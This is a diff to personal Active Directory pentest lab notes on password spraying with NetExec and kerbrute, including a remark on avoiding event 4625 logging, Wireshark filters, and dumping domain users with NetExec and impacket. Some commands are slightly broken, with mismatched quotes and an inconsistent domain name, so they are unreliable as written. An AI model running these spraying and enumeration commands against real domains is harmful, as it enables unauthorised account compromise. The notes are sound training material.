@@ -58,10 +58,42 @@ nxc smb 192.168.56.10 -u service-accts.txt -p Password123!
 SMB vs Kerberos Spraying:
 Kerberos - fast, UDP, no TCP overhead, less noise - only 2 frames to check password, failed kerberos pre-authentication does not trigger a Logon failure event (4625), need to manually configure DC for kerbes login event logging (event 4771: Kerberos pre-authentication)
 
-nxc smb 192.168.56.10 -u service-accts.txt -p Password123! -d child.child.ad
+nxc smb 192.168.56.10 -u service-accts.txt -p Password123! -d child.client.ad
 Wireshark filters: 
 ip.addr==192.168.50.20 && ip.addr==192.168.56.11
 ip.addr==192.168.50.20 && ip.addr==192.168.56.11 && smb || smb2
+
+kerbrute -user administrator -password Password123! -domain child.client.ad -dc-ip 192.168.56.11
+ip.addr==192.168.50.20 && ip.addr==192.168.56.11 && kerberos
+(it generates very little traffic with kerbrute, which is good. A total of 4 packets.)
+
+kerbrute -users usernames.new -password 'Password123!' -domain 'child.child.ad'
+(if it discovers a valid account and password, it requests automatically a TGT for that account)
+(we can use the <user-name>.ccache against AD kerberos without even using the password)
+
+- check the username/password against the domain controller
+nxc smb 192.168.56.11 -u 'bill.gates' -p 'Password123!" -d child.client.ad
+
+- dumping AD users with NetExec, Impacket-GetADUsers and ldapsearch
+nxc smb 192.168.56.11 -u 'bill.gates' -p 'Password123!" -d child.client.ad --users
+
+impacket-GetADUsers -all 'child.client.ad/bill.gates:Password123!'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
